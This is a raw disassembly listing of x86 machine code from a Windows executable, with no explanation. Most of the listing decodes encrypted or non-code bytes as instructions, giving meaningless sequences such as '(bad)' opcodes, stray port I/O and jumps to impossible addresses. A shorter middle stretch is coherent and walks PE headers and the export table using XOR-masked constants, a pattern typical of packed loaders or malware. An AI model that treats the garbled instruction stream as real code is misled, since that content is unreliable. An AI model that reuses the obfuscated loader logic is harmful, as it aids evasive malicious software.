  423885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423886:	clc    
  423887:	pusha  
  423888:	mov    ecx,0x91687157
  42388d:	and    DWORD PTR [ebx],ebp
  42388f:	ins    DWORD PTR es:[edi],dx
  423890:	lods   eax,DWORD PTR ds:[esi]
  423891:	pop    ss
  423892:	ds idiv BYTE PTR fs:[ecx+edi*8+0x26b812ba]
  42389b:	and    bl,al
  42389d:	xchg   BYTE PTR [eax-0x39],cl
  4238a0:	ss push es
  4238a2:	jmp    DWORD PTR [ebx+edi*4+0x174117e2]
  4238a9:	mov    al,ds:0x33dbf8d0
  4238ae:	popa   
  4238af:	outs   dx,BYTE PTR ds:[esi]
  4238b0:	frstor cs:[ebp-0x2c]
  4238b4:	push   ebx
  4238b5:	jmp    0xfa02cb9
  4238ba:	lods   al,BYTE PTR ds:[esi]
  4238bb:	mov    ds:0x584c25b3,al
  4238c0:	lea    ebx,[ebp+0x1d]
  4238c3:	ret    0x4591
  4238c6:	fisub  DWORD PTR [ebp-0x2c0c2fa4]
  4238cc:	sbb    ch,BYTE PTR [eax]
  4238ce:	and    ecx,DWORD PTR [edi+0x3]
  4238d1:	mov    ebx,0x3c4bca37
  4238d6:	imul   ecx,DWORD PTR [ebp+eiz*8-0x66],0xffffff9e
  4238db:	gs iret 
  4238dd:	lock cmp eax,DWORD PTR ds:[esi+ebp*4]
  4238e2:	xchg   ebx,eax
  4238e3:	mov    dh,0xc3
  4238e5:	test   DWORD PTR [eax+0x30],esi
  4238e8:	out    0x67,eax
  4238ea:	sbb    eax,0x76005f68
  4238ef:	sub    eax,0xe88c3811
  4238f4:	pop    ebx
  4238f5:	fisub  DWORD PTR [ebx]
  4238f7:	into   
  4238f8:	shr    bl,1
  4238fa:	or     eax,0xe70d955a
  4238ff:	jmp    0x4238f8
  423901:	mov    ebp,0x85afc0a
  423906:	lea    ecx,[ebx]
  423908:	xor    cl,bl
  42390a:	arpl   WORD PTR [ebx+0x5b824dd],sp
  423910:	daa    
  423911:	push   0xffffff80
  423913:	into   
  423914:	jmp    0x9bd519c3
  423919:	popa   
  42391a:	xor    BYTE PTR [ebp+0x477f9435],0xee
  423921:	ret    
  423922:	push   cs
  423923:	jns    0x423910
  423925:	ins    BYTE PTR es:[edi],dx
  423926:	inc    ecx
  423927:	push   edi
  423928:	inc    ebx
  423929:	xor    BYTE PTR [ebp+0x12617de1],dh
  42392f:	or     eax,0xeaef0a2d
  423934:	(bad)  
  423935:	das    
  423936:	mov    eax,ds:0x4ff0f373
  42393b:	mov    eax,0xe1653c57
  423940:	(bad)  
  423942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423943:	hlt    
  423944:	rol    DWORD PTR ds:0xfc95accd,cl
  42394a:	adc    eax,0x3c497114
  42394f:	or     ebx,eax
  423951:	mov    dl,0x93
  423953:	fcomp  QWORD PTR [edi-0x23074d37]
  423959:	mov    edx,0xd2c0d09a
  42395e:	add    eax,0x707188ec
  423963:	loop   0x4239b9
  423965:	jae    0x423978
  423967:	pop    ebp
  423968:	dec    esi
  423969:	mov    ds:0xfe6be9e7,eax
  42396e:	add    DWORD PTR [eax-0x3f],ebp
  423971:	sub    edx,DWORD PTR [eax+ebx*1]
  423974:	shl    DWORD PTR [ecx+0x28ea71c3],0x83
  42397b:	cmp    al,0xce
  42397d:	imul   ebx,DWORD PTR [eax+0x1e],0xffffff9e
  423981:	retf   
  423982:	out    dx,eax
  423983:	sub    eax,0xc0ba5fea
  423988:	sub    DWORD PTR [eax],0xffffffad
  42398b:	sbb    DWORD PTR [edi],esp
  42398d:	(bad)  
  42398f:	retf   0xcae8
  423992:	push   esp
  423993:	jg     0x4239e8
  423995:	enter  0xb776,0xe4
  423999:	mov    ecx,0xf01b56b9
  42399e:	aam    0xfa
  4239a0:	cli    
  4239a1:	adc    BYTE PTR [ebx],0x7e
  4239a4:	into   
  4239a5:	adc    esi,ebp
  4239a7:	mov    eax,ds:0x1a3c8858
  4239ac:	popf   
  4239ad:	clc    
  4239ae:	push   cs
  4239af:	ss (bad) 
  4239b1:	int    0xa9
  4239b3:	sub    dh,bl
  4239b5:	and    DWORD PTR [ecx+0x3a6f399e],ecx
  4239bb:	jmp    0xc8d1:0x8aa156d1
  4239c2:	in     eax,dx
  4239c3:	test   al,0xee
  4239c5:	mov    cl,0xd0
  4239c7:	sahf   
  4239c8:	neg    BYTE PTR [edi]
  4239ca:	inc    esi
  4239cb:	in     al,dx
  4239cc:	sub    esi,DWORD PTR [eax]
  4239ce:	push   0x7d
  4239d0:	and    ch,BYTE PTR [edi]
  4239d2:	adc    eax,0x6e1c8558
  4239d7:	push   es
  4239d8:	cmp    DWORD PTR [ebx],ebx
  4239da:	pop    esp
  4239db:	cmp    cl,0x9b
  4239de:	inc    edx
  4239df:	(bad)  
  4239e0:	cmc    
  4239e1:	jge    0x42397c
  4239e3:	retf   0xdcdc
  4239e6:	iret   
  4239e7:	lock stos BYTE PTR es:[edi],al
  4239e9:	ja     0x423a3a
  4239eb:	(bad)  
  4239ec:	xor    BYTE PTR [edx+0x2a],bl
  4239ef:	and    edi,ecx
  4239f1:	dec    esi
  4239f2:	mov    WORD PTR [ebx],gs
  4239f4:	push   edi
  4239f5:	shl    DWORD PTR [eax],cl
  4239f7:	ins    DWORD PTR es:[edi],dx
  4239f8:	imul   eax,esi,0x3e
  4239fb:	test   BYTE PTR [eax],bh
  4239fd:	pushf  
  4239fe:	fsubr  DWORD PTR [ebp-0x69]
  423a01:	out    dx,al
  423a02:	xchg   ecx,eax
  423a03:	sub    eax,0x9c03e014
  423a08:	test   al,0x2c
  423a0a:	mov    ah,0xc1
  423a0c:	xchg   ebx,eax
  423a0d:	lock push ecx
  423a0f:	mov    bh,0x8e
  423a11:	jp     0x4239d8
  423a13:	adc    eax,0xb9d492e1
  423a18:	pop    esp
  423a19:	inc    eax
  423a1a:	mov    dl,0xdb
  423a1c:	ds mov esi,0xac4e1360
  423a22:	pusha  
  423a23:	hlt    
  423a24:	mov    bh,BYTE PTR [ecx+0x3a2220b8]
  423a2a:	and    bh,BYTE PTR [esi]
  423a2c:	out    dx,eax
  423a2d:	pusha  
  423a2e:	sbb    al,0xa8
  423a31:	dec    ebx
  423a32:	ror    DWORD PTR [edx-0x5e1ec8d7],cl
  423a38:	leave  
  423a39:	jmp    0x423a49
  423a3b:	cwde   
  423a3c:	dec    ecx
  423a3d:	ds jmp 0xb3b58f99
  423a43:	push   esp
  423a44:	cmp    ebx,eax
  423a46:	pop    eax
  423a47:	js     0x423a3f
  423a49:	dec    edx
  423a4a:	cmp    eax,0x16477959
  423a4f:	cs mov bl,0x9a
  423a52:	cmp    DWORD PTR [esi+0x634537f0],edx
  423a58:	add    ebx,ecx
  423a5a:	(bad)  
  423a5c:	jmp    0x25b:0xd80ba067
  423a63:	xchg   ecx,eax
  423a64:	ds dec esi
  423a66:	pop    es
  423a67:	jb     0x423a6b
  423a69:	sar    BYTE PTR [edi],1
  423a6b:	mov    BYTE PTR [edi-0x7c75caa4],bh
  423a71:	pop    ebx
  423a72:	add    eax,DWORD PTR [esi]
  423a74:	mov    esp,0x68ebf595
  423a79:	fnstcw WORD PTR [edx]
  423a7b:	stos   BYTE PTR es:[edi],al
  423a7c:	xchg   BYTE PTR [eax],bl
  423a7e:	inc    eax
  423a7f:	cmp    eax,0xb31b0db
  423a84:	fisttp QWORD PTR [edx+ecx*1-0x12]
  423a88:	xchg   DWORD PTR [ebx+0x6f],edi
  423a8b:	out    0xfa,al
  423a8d:	out    dx,eax
  423a8e:	cs aad 0x4a
  423a91:	scas   al,BYTE PTR es:[edi]
  423a92:	sub    eax,0xcaff129e
  423a97:	or     ecx,DWORD PTR [eax]
  423a99:	sbb    al,0x9
  423a9b:	push   edi
  423a9c:	and    DWORD PTR [eax+0x6d],esp
  423a9f:	(bad)  
  423aa0:	jno    0x423a70
  423aa2:	das    
  423aa3:	ins    DWORD PTR es:[edi],dx
  423aa4:	(bad)  
  423aa5:	pop    es
  423aa6:	sub    eax,0x1103e51e
  423aab:	sbb    BYTE PTR [edx+0x1e35e647],0xea
  423ab2:	out    0x94,eax
  423ab4:	sub    DWORD PTR [edi+0x25300355],edx
  423aba:	xchg   esp,eax
  423abb:	sub    dh,bh
  423abd:	fnsave [ecx+0x768578d0]
  423ac3:	jb     0x423a7b
  423ac5:	das    
  423ac6:	fnsave [esi+edi*2+0x7ec800df]
  423acd:	enter  0x5c5d,0x64
  423ad1:	test   al,0x6
  423ad3:	arpl   WORD PTR [edx+0x328f75ef],si
  423ad9:	push   0x79
  423adb:	pop    ecx
  423adc:	les    ebp,FWORD PTR ss:[esi+0x49]
  423ae0:	cmp    eax,0x9f8ba47f
  423ae5:	popa   
  423ae6:	popf   
  423ae7:	enter  0xf9db,0xc8
  423aeb:	inc    edi
  423aec:	pop    esp
  423aed:	lds    ecx,FWORD PTR [ecx]
  423aef:	mov    ah,0x6b
  423af1:	push   es
  423af2:	out    dx,eax
  423af3:	in     eax,0x28
  423af5:	cwde   
  423af6:	lea    esi,[edi]
  423af8:	rol    BYTE PTR [ebp-0x50],0x63
  423afc:	dec    ebx
  423afd:	push   0xf4f3e007
  423b02:	lods   al,BYTE PTR ds:[esi]
  423b03:	sahf   
  423b04:	mov    bh,0x28
  423b06:	ret    
  423b07:	inc    esp
  423b08:	push   ebp
  423b09:	push   ecx
  423b0a:	sbb    esp,DWORD PTR [eax-0x6a0f3ffd]
  423b10:	pop    esp
  423b11:	push   ds
  423b12:	out    dx,al
  423b13:	out    dx,al
  423b14:	fcomp  QWORD PTR [eax]
  423b16:	in     al,dx
  423b17:	adc    al,0xfd
  423b19:	inc    esi
  423b1a:	mov    edx,DWORD PTR [ebp-0x8]
  423b1d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  423b25:	mov    edx,DWORD PTR [ebp-0x54]
  423b28:	xor    edx,esi
  423b2a:	lea    eax,[edx+eax*1+0x3272db]
  423b31:	movzx  edx,BYTE PTR [ebp-0x1]
  423b35:	xor    edx,eax
  423b37:	mov    BYTE PTR [ebp-0x1],dl
  423b3a:	mov    al,BYTE PTR [ebp-0x1]
  423b3d:	mov    edx,DWORD PTR [ebp-0x1c]
  423b40:	mov    ebx,DWORD PTR [ebp-0xc]
  423b43:	xor    edx,esi
  423b45:	add    edx,edi
  423b47:	imul   edx,ebx
  423b4a:	mov    ebx,DWORD PTR [ebp-0x8]
  423b4d:	mov    BYTE PTR [edx+ebx*1],al
  423b50:	mov    eax,DWORD PTR [ebp-0x30]
  423b53:	mov    edx,DWORD PTR [ebp-0x3c]
  423b56:	xor    eax,esi
  423b58:	xor    edx,esi
  423b5a:	add    eax,edi
  423b5c:	add    edx,edi
  423b5e:	imul   eax,edx
  423b61:	add    eax,DWORD PTR [ebp-0xc]
  423b64:	mov    DWORD PTR [ebp-0xc],eax
  423b67:	mov    eax,DWORD PTR [ebp-0xc]
  423b6a:	mov    edx,DWORD PTR [ebp-0x24]
  423b6d:	cmp    edx,eax
  423b6f:	jb     0x41e9a5
  423b75:	mov    eax,DWORD PTR [ebp-0x3c]
  423b78:	mov    edx,DWORD PTR [ebp-0x24]
  423b7b:	xor    eax,esi
  423b7d:	add    eax,edi
  423b7f:	imul   eax,edx
  423b82:	mov    edx,DWORD PTR [ebp-0x20]
  423b85:	xor    edx,esi
  423b87:	add    edx,edi
  423b89:	or     eax,edx
  423b8b:	mov    edx,DWORD PTR [ebp-0x18]
  423b8e:	xor    edx,esi
  423b90:	add    eax,edx
  423b92:	mov    edx,DWORD PTR [ebp-0x18]
  423b95:	xor    edx,esi
  423b97:	add    eax,edx
  423b99:	mov    edx,DWORD PTR [ebp-0x10]
  423b9c:	lea    eax,[eax+edx*1+0x64e5b6]
  423ba3:	jmp    0x423bb7
  423ba8:	mov    eax,DWORD PTR [ebp-0x18]
  423bab:	mov    edx,DWORD PTR [ebp-0x10]
  423bae:	xor    eax,esi
  423bb0:	lea    eax,[eax+edx*1+0x3272db]
  423bb7:	mov    DWORD PTR [ebp-0x10],eax
  423bba:	jmp    0x41e8f2
  423bbf:	mov    eax,DWORD PTR [ebp-0x38]
  423bc2:	mov    edx,DWORD PTR [ebp+0xc]
  423bc5:	xor    edx,esi
  423bc7:	lea    ecx,[ecx+edx*1+0x3272db]
  423bce:	lea    edx,[ecx-0x3272db]
  423bd4:	xor    edx,esi
  423bd6:	cmp    edx,0xf89c95b6
  423bdc:	jne    0x41e770
  423be2:	mov    ecx,DWORD PTR [ebp+0x8]
  423be5:	mov    edx,DWORD PTR [ebp+0xc]
  423be8:	mov    ebx,DWORD PTR [ebp+0x8]
  423beb:	xor    edx,esi
  423bed:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  423bf4:	xor    ecx,esi
  423bf6:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  423bfd:	xor    ebx,esi
  423bff:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  423c06:	mov    edx,DWORD PTR [ebp+0xc]
  423c09:	xor    edx,esi
  423c0b:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  423c12:	mov    eax,DWORD PTR [ebp+0xc]
  423c15:	xor    eax,esi
  423c17:	add    eax,edi
  423c19:	pop    edi
  423c1a:	pop    esi
  423c1b:	pop    ebx
  423c1c:	leave  
  423c1d:	ret    0x8
  423c20:	push   ebp
  423c21:	mov    ebp,esp
  423c23:	push   ecx
  423c24:	mov    eax,ds:0x42c008
  423c29:	xor    DWORD PTR ds:0x42c000,eax
  423c2f:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  423c36:	mov    eax,DWORD PTR [ebp+0x8]
  423c39:	sbb    DWORD PTR ds:0x42d010,0x5f50
  423c43:	mov    al,BYTE PTR [eax]
  423c45:	add    DWORD PTR ds:0x429020,0x42b018
  423c4f:	add    al,0xd
  423c51:	xor    DWORD PTR ds:0x42901c,0x429000
  423c5b:	xor    al,0x6f
  423c5d:	mov    DWORD PTR ds:0x42d008,0x56e
  423c67:	cmp    al,0x35
  423c69:	mov    DWORD PTR ds:0x42c000,0x518
  423c73:	jne    0x423cee
  423c79:	mov    eax,DWORD PTR [ebp+0x8]
  423c7c:	mov    edx,DWORD PTR ds:0x429014
  423c82:	or     DWORD PTR ds:0x429010,edx
  423c88:	mov    ecx,DWORD PTR [ebp+0x8]
  423c8b:	add    ecx,DWORD PTR [eax+0x3c]
  423c8e:	mov    edx,0x7510893
  423c93:	adc    eax,DWORD PTR ds:0x42c01c
  423c99:	mov    DWORD PTR [ebp+0x8],ecx
  423c9c:	mov    eax,DWORD PTR [ebp-0x4]
  423c9f:	xor    eax,edx
  423ca1:	adc    ecx,0x2aad
  423ca7:	push   esi
  423ca8:	add    DWORD PTR ds:0x42d01c,0x22ba
  423cb2:	mov    esi,DWORD PTR [ebp+0x8]
  423cb5:	xor    ecx,ecx
  423cb7:	xor    ecx,DWORD PTR ds:0x42901c
  423cbd:	xor    ecx,DWORD PTR ds:0x42a010
  423cc3:	mov    DWORD PTR ds:0x42901c,ecx
  423cc9:	mov    ecx,0x3272db
  423cce:	add    eax,ecx
  423cd0:	cmp    DWORD PTR [esi+0x54],eax
  423cd3:	pop    esi
  423cd4:	je     0x423ce2
  423cda:	mov    eax,DWORD PTR [ebp+0x8]
  423cdd:	jmp    0x423cfb
  423ce2:	mov    eax,DWORD PTR [ebp-0x4]
  423ce5:	xor    eax,edx
  423ce7:	add    eax,ecx
  423ce9:	jmp    0x423cfb
  423cee:	mov    eax,DWORD PTR [ebp-0x4]
  423cf1:	xor    eax,0x7510893
  423cf6:	add    eax,0x3272db
  423cfb:	leave  
  423cfc:	ret    0x4
  423cff:	push   ebp
  423d00:	mov    ebp,esp
  423d02:	push   ecx
  423d03:	sub    DWORD PTR ds:0x42d010,0x2dcc
  423d0d:	push   ecx
  423d0e:	and    DWORD PTR ds:0x42d014,0x0
  423d18:	jmp    0x423d2c
  423d1d:	xor    edx,edx
  423d1f:	add    edx,DWORD PTR ds:0x42d014
  423d25:	inc    edx
  423d26:	mov    DWORD PTR ds:0x42d014,edx
  423d2c:	cmp    DWORD PTR ds:0x42d014,0x1d
  423d33:	jae    0x423d6a
  423d39:	cmp    DWORD PTR ds:0x42d014,0x26
  423d40:	jne    0x423d65
  423d46:	push   0x643f
  423d4b:	push   DWORD PTR [ebp-0x24]
  423d4e:	push   0x42a010
  423d53:	push   DWORD PTR [ebp-0xc]
  423d56:	push   DWORD PTR [ebp-0x10]
  423d59:	push   DWORD PTR [ebp-0x10]
  423d5c:	push   DWORD PTR [ebp-0x28]
  423d5f:	call   DWORD PTR ds:0x42502c
  423d65:	jmp    0x423d1d
  423d6a:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  423d71:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  423d78:	dec    eax
  423d79:	mov    eax,DWORD PTR [ebp-0x4]
  423d7c:	add    edx,0x6ccb
  423d82:	push   esi
  423d83:	mov    esi,DWORD PTR [ebp-0x8]
  423d86:	adc    DWORD PTR ds:0x42a00c,ebx
  423d8c:	mov    edx,0x7510893
  423d91:	sbb    DWORD PTR ds:0x42c018,0x5978
  423d9b:	xor    eax,edx
  423d9d:	sbb    DWORD PTR ds:0x42901c,0x3646
  423da7:	xor    esi,edx
  423da9:	sub    DWORD PTR ds:0x429014,0x4430
  423db3:	mov    ecx,0x3272db
  423db8:	sbb    DWORD PTR ds:0x42d01c,0x42900c
  423dc2:	add    esi,ecx
  423dc4:	mov    DWORD PTR ds:0x42a010,0x31b3
  423dce:	add    eax,ecx
  423dd0:	inc    DWORD PTR ds:0x42c01c
  423dd6:	imul   eax,esi
  423dd9:	mov    esi,DWORD PTR [ebp+0xc]
  423ddc:	mov    DWORD PTR ds:0x429028,0xd41
  423de6:	cmp    esi,eax
  423de8:	jne    0x423e06
  423dee:	and    esi,eax
  423df0:	mov    eax,DWORD PTR [ebp-0x4]
  423df3:	mov    esi,DWORD PTR [ebp-0x8]
  423df6:	xor    eax,edx
  423df8:	xor    esi,edx
  423dfa:	add    eax,ecx
  423dfc:	add    esi,ecx
  423dfe:	imul   eax,esi
  423e01:	jmp    0x423e41
  423e06:	mov    eax,DWORD PTR [ebp+0xc]
  423e09:	mov    eax,DWORD PTR [eax+0x78]
  423e0c:	mov    DWORD PTR [ebp+0xc],eax
  423e0f:	mov    eax,DWORD PTR [ebp-0x4]
  423e12:	mov    esi,DWORD PTR [ebp-0x8]
  423e15:	xor    eax,edx
  423e17:	xor    esi,edx
  423e19:	add    eax,ecx
  423e1b:	add    esi,ecx
  423e1d:	imul   eax,esi
  423e20:	mov    esi,DWORD PTR [ebp+0xc]
  423e23:	cmp    esi,eax
  423e25:	mov    eax,DWORD PTR [ebp-0x4]
  423e28:	je     0x423df3
  423e2e:	xor    eax,edx
  423e30:	add    eax,ecx
  423e32:	mov    ecx,DWORD PTR [ebp+0xc]
  423e35:	imul   eax,ecx
  423e38:	add    eax,DWORD PTR [ebp+0x8]
  423e3b:	mov    DWORD PTR [ebp+0xc],eax
  423e3e:	mov    eax,DWORD PTR [ebp+0xc]
  423e41:	pop    esi
  423e42:	leave  
  423e43:	ret    0x8
  423e46:	add    BYTE PTR [eax-0x5ffbffbe],ah
  423e4c:	inc    edx
  423e4d:	add    BYTE PTR [eax],cl
  423e4f:	mov    al,ds:0xa00c0042
  423e54:	inc    edx
  423e55:	add    BYTE PTR [eax],dl
  423e57:	mov    al,ds:0xa0140042
  423e5c:	inc    edx
  423e5d:	add    BYTE PTR [eax],bl
  423e5f:	mov    al,ds:0xa01c0042
  423e64:	inc    edx
  423e65:	add    BYTE PTR [eax],al
  423e67:	mov    al,0x42
  423e69:	add    BYTE PTR [eax+esi*4],al
  423e6c:	inc    edx
  423e6d:	add    BYTE PTR [eax],cl
  423e6f:	mov    al,0x42
  423e71:	add    BYTE PTR [eax+esi*4],cl
  423e74:	inc    edx
  423e75:	add    BYTE PTR [eax],dl
  423e77:	mov    al,0x42
  423e79:	add    BYTE PTR [eax+esi*4],dl
  423e7c:	inc    edx
  423e7d:	add    BYTE PTR [eax],bl
  423e7f:	mov    al,0x42
  423e81:	add    BYTE PTR [eax+esi*4],bl
  423e84:	inc    edx
  423e85:	add    BYTE PTR [eax],al
  423e87:	rol    BYTE PTR [edx+0x0],0x4
  423e8b:	rol    BYTE PTR [edx+0x0],0x8
  423e8f:	rol    BYTE PTR [edx+0x0],0xc
  423e93:	rol    BYTE PTR [edx+0x0],0x10
  423e97:	rol    BYTE PTR [edx+0x0],0x14
  423e9b:	rol    BYTE PTR [edx+0x0],0x18
  423e9f:	rol    BYTE PTR [edx+0x0],0x1c
  423ea3:	rol    BYTE PTR [edx+0x0],0x75
  423ea7:	ins    DWORD PTR es:[edi],dx
  423ea8:	push   ecx
  423ea9:	push   eax
  423eaa:	jo     0x423f26
  423eac:	addr16 jo 0x423f05
  423eaf:	pop    eax
  423eb0:	inc    ebp
  423eb1:	push   edx
  423eb2:	jb     0x423f28
  423eb4:	inc    esi
  423eb5:	je     0x423efe
  423eb7:	gs ins BYTE PTR es:[edi],dx
  423eb9:	dec    esp
  423eba:	js     0x423f24
  423ebc:	inc    edx
  423ebd:	js     0x423f05
  423ebf:	arpl   WORD PTR [edx+0x66],ax
  423ec2:	inc    ebx
  423ec3:	push   ebp
  423ec4:	jno    0x423f3c
  423ec6:	bound  eax,QWORD PTR [edx+0x42]
  423ec9:	add    BYTE PTR [edx+0x42],ch
  423ecc:	inc    edx
  423ecd:	add    BYTE PTR [esi],cl
  423ecf:	inc    ecx
  423ed0:	inc    edx
  423ed1:	add    bh,ch
  423ed3:	or     esi,DWORD PTR [edx+0x304e790e]
  423ed9:	dec    esi
  423eda:	xchg   DWORD PTR [edi+0x3d],ecx
  423edd:	dec    esi
  423ede:	scas   eax,DWORD PTR es:[edi]
  423edf:	dec    edi
  423ee0:	ds dec esi
  423ee2:	js     0x423f32
  423ee4:	cmp    ecx,DWORD PTR [esi-0x64]
  423ee7:	dec    edi
  423ee8:	inc    esp
  423ee9:	dec    esi
  423eea:	jae    0x423f3a
  423eec:	inc    ecx
  423eed:	dec    esi
  423eee:	xor    BYTE PTR [esi+0x40],cl
  423ef1:	dec    esi
  423ef2:	pop    esp
  423ef3:	pop    ebp
  423ef4:	pop    edi
  423ef5:	push   edx
  423ef6:	cmp    DWORD PTR [esi+0x79],ecx
  423ef9:	dec    esi
  423efa:	xor    BYTE PTR [esi-0x79],cl
  423efd:	dec    edi
  423efe:	cmp    eax,0x3e4faf4e
  423f03:	dec    esi
  423f04:	js     0x423f54
  423f06:	cmp    ecx,DWORD PTR [esi-0x64]
  423f09:	dec    edi
  423f0a:	inc    esp
  423f0b:	dec    esi
  423f0c:	mov    DWORD PTR [edi+0x41],ecx
  423f0f:	dec    esi
  423f10:	xor    BYTE PTR [esi+0x40],cl
  423f13:	dec    esi
  423f14:	pop    esp
  423f15:	ins    DWORD PTR es:[edi],dx
  423f16:	pop    edi
  423f17:	bound  edi,QWORD PTR [ecx]
  423f19:	dec    esi
  423f1a:	jns    0x423f6a
  423f1c:	xor    BYTE PTR [esi-0x80],cl
  423f1f:	dec    edi
  423f20:	cmp    eax,0x394e734e
  423f25:	dec    esi
  423f26:	mov    ds:0x304e3a4f,al
  423f2b:	dec    esi
  423f2c:	inc    esi
  423f2d:	dec    esi
  423f2e:	pop    esp
  423f2f:	jge    0x423f90
  423f31:	jb     0x423fa2
  423f33:	sub    BYTE PTR [esi-0x7d],0x7e
  423f37:	xchg   ebx,eax
  423f38:	jns    0x423eca
  423f3a:	aas    
  423f3b:	dec    esi
  423f3c:	test   BYTE PTR [edi+0x30],cl
  423f3f:	dec    esi
  423f40:	test   BYTE PTR [edi+0x3c],cl
  423f43:	dec    esi
  423f44:	mov    ds:0x734e394f,al
  423f49:	dec    esi
  423f4a:	inc    ebp
  423f4b:	dec    esi
  423f4c:	xor    BYTE PTR [esi+0x44],cl
  423f4f:	dec    esi
  423f50:	pop    esp
  423f51:	lea    ebx,[edi-0x7e]
  423f54:	outs   dx,DWORD PTR ds:[esi]
  423f55:	xchg   edx,eax
  423f56:	outs   dx,BYTE PTR ds:[esi]
  423f57:	xchg   ebx,eax
  423f58:	jle    0x423efd
  423f5a:	jns    0x423efc
  423f5c:	aas    
  423f5d:	dec    esi
  423f5e:	test   BYTE PTR [edi+0x30],cl
  423f61:	dec    esi
  423f62:	test   BYTE PTR [edi+0x3c],cl
  423f65:	dec    esi
  423f66:	mov    ds:0x894e394f,al
  423f6b:	dec    edi
  423f6c:	inc    ebp
  423f6d:	dec    esi
  423f6e:	xor    BYTE PTR [esi+0x44],cl
  423f71:	dec    esi
  423f72:	pop    esp
  423f73:	popf   
  423f74:	pop    edi
  423f75:	xchg   edx,eax
  423f76:	outs   dx,DWORD PTR ds:[esi]
  423f77:	mov    ds:0xb37ea36e,al
  423f7c:	jns    0x423f2e
  423f7e:	aas    
  423f7f:	dec    esi
  423f80:	mov    cs,WORD PTR [edi+0x30]
  423f83:	dec    esi
  423f84:	lods   al,BYTE PTR ds:[esi]
  423f85:	dec    edi
  423f86:	cmp    eax,0x394e734e
  423f8b:	dec    esi
  423f8c:	mov    eax,ds:0x304e3a4f
  423f91:	dec    esi
  423f92:	inc    esp
  423f93:	dec    esi
  423f94:	pop    esp
  423f95:	lods   eax,DWORD PTR ds:[esi]
  423f96:	pop    edi
  423f97:	mov    ds:0xb36eb26f,al
  423f9c:	jle    0x423f61
  423f9e:	jns    0x423f60
  423fa0:	aas    
  423fa1:	dec    esi
  423fa2:	mov    cs,WORD PTR [edi+0x30]
  423fa5:	dec    esi
  423fa6:	lods   al,BYTE PTR ds:[esi]
  423fa7:	dec    edi
  423fa8:	cmp    eax,0x394e7e4e
  423fad:	dec    esi
  423fae:	lahf   
  423faf:	dec    edi
  423fb0:	cmp    ecx,DWORD PTR [esi+0x30]
  423fb3:	dec    esi
  423fb4:	inc    ebp
  423fb5:	dec    esi
  423fb6:	pop    esp
  423fb7:	mov    ebp,0xc26fb25f
  423fbc:	outs   dx,BYTE PTR ds:[esi]
  423fbd:	ret    
  423fbe:	jle    0x423f93
  423fc0:	jns    0x423f92
  423fc2:	aas    
  423fc3:	dec    esi
  423fc4:	mov    cs,WORD PTR [edi+0x30]
  423fc7:	dec    esi
  423fc8:	lods   al,BYTE PTR ds:[esi]
  423fc9:	dec    edi
  423fca:	cmp    eax,0x394f804e
  423fcf:	dec    esi
  423fd0:	lods   al,BYTE PTR ds:[esi]
  423fd1:	dec    edi
  423fd2:	cmp    cl,BYTE PTR [esi+0x30]
  423fd5:	dec    esi
  423fd6:	inc    esi
  423fd7:	dec    esi
  423fd8:	pop    esp
  423fd9:	int    0x5f
  423fdb:	ret    0xd26f
  423fde:	outs   dx,BYTE PTR ds:[esi]
  423fdf:	sar    DWORD PTR [esi-0x1d],cl
  423fe2:	jns    0x423fc4
  423fe4:	aas    
  423fe5:	dec    esi
  423fe6:	mov    cs,WORD PTR [edi+0x30]
  423fe9:	dec    esi
  423fea:	lods   al,BYTE PTR ds:[esi]
  423feb:	dec    edi
  423fec:	cmp    eax,0x394f834e
  423ff1:	dec    esi
  423ff2:	mov    ds:0x304e3a4f,al
  423ff7:	dec    esi
  423ff8:	inc    esp
  423ff9:	dec    esi
  423ffa:	pop    esp
  423ffb:	fstp   QWORD PTR [edi-0x2e]
  423ffe:	outs   dx,DWORD PTR ds:[esi]
  423fff:	loop   0x42406f
  424001:	jecxz  0x424081
  424003:	repz jns 0x423ff6
  424006:	aas    
  424007:	dec    esi
  424008:	lea    ecx,[edi+0x30]
  42400b:	dec    esi
  42400c:	lahf   
  42400d:	dec    edi
  42400e:	cmp    eax,0x3c4fa04e
  424013:	dec    esi
  424014:	xor    BYTE PTR [esi+0x3f],cl
  424017:	dec    esi
  424018:	pop    esp
  424019:	in     eax,dx
  42401a:	pop    edi
  42401b:	loop   0x42408c
  42401d:	repnz outs dx,BYTE PTR ds:[esi]
  42401f:	repz jle 0x424025
  424022:	jns    0x424024
  424024:	jle    0x424039
  424026:	jns    0x424038
  424028:	cmp    al,0x4e
  42402a:	jg     0x42407a
  42402c:	xor    BYTE PTR [esi-0x65],cl
  42402f:	dec    edi
  424030:	xor    cl,BYTE PTR [esi-0x80]
  424033:	dec    edi
  424034:	cmp    al,0x4e
  424036:	lods   eax,DWORD PTR ds:[esi]
  424037:	dec    edi
  424038:	cmp    ecx,DWORD PTR [esi+0x30]
  42403b:	dec    esi
  42403c:	inc    ebp
  42403d:	dec    esi
  42403e:	pop    esp
  42403f:	or     eax,0x126f025f
  424044:	outs   dx,BYTE PTR ds:[esi]
  424045:	adc    edi,DWORD PTR [esi+0x23]
  424048:	jns    0x42406a
  42404a:	aas    
  42404b:	dec    esi
  42404c:	add    BYTE PTR [eax],al
  42404e:	(bad)  
  42404f:	ds inc edx
  424051:	add    dl,cl
  424053:	inc    eax
  424054:	inc    edx
  424055:	add    dl,dl
  424057:	inc    eax
  424058:	inc    edx
  424059:	add    BYTE PTR [esi+0x42],ch
  42405c:	inc    edx
  42405d:	add    dh,dl
  42405f:	inc    ecx
  424060:	inc    edx
  424061:	add    BYTE PTR [esi+0x42],bl
  424064:	inc    edx
  424065:	add    BYTE PTR [edx-0x49ffbdc0],dh
  42406b:	inc    eax
  42406c:	inc    edx
  42406d:	add    BYTE PTR [edx+0x42],bl
  424070:	inc    edx
  424071:	add    BYTE PTR [edx],bl
  424073:	inc    ecx
  424074:	inc    edx
  424075:	add    BYTE PTR ds:0x36f89ca9,cl
  42407b:	mov    edx,0x40cef89c
  424080:	inc    edx
  424081:	add    BYTE PTR [edx-0x59ffbdbf],dl
  424087:	inc    ecx
  424088:	inc    edx
